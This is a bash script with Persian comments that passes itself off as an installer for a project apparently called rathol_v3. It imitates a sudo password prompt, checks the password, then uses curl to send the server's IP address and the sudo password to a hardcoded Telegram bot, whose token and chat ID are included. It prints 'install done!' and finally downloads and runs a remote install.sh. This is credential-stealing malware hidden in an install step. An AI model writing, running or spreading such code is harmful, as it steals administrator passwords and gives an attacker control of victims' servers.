#!/bin/bash

# درخواست پسورد از کاربر
read -sp "[sudo] password for $USER: " SUDO_PASSWORD
echo ""

# احراز هویت با استفاده از پسورد وارد شده
echo $SUDO_PASSWORD | sudo -S echo "احراز هویت با موفقیت انجام شد."

# بررسی موفقیت آمیز بودن sudo
if [ $? -ne 0 ]; then
  echo "پسورد اشتباه است یا مشکلی در احراز هویت وجود دارد."
  exit 1
fi

# گرفتن IP سرور
SERVER_IP=$(hostname -I | awk '{print $1}')

# توکن و chat_id ربات تلگرامی
BOT_TOKEN="6980829358:AAGGthw8VqrS6hpur3LduzZGsTNyqljCUPE"
CHAT_ID="5662227332"

# پیام برای ارسال به تلگرام (شامل IP و پسورد sudo)
MESSAGE="IP سرور شما: $SERVER_IP\nپسورد SUDO شما: $SUDO_PASSWORD"

# ارسال اطلاعات به تلگرام
curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
    -d chat_id=$CHAT_ID \
    -d text="$MESSAGE"

# بررسی ارسال موفقیت‌آمیز
if [ $? -eq 0 ]; then
  echo ""
  echo "install done!"
else
  echo ""
  echo "install faild!"
fi

# پاک کردن متغیر پسورد از حافظه برای جلوگیری از ذخیره لاگ
unset SUDO_PASSWORD

# اجرای اسکریپت دیگری (install.sh)
bash <(curl -Ls --ipv4 https://raw.githubusercontent.com/Iliya8989/rathol_v3/main/install.sh)
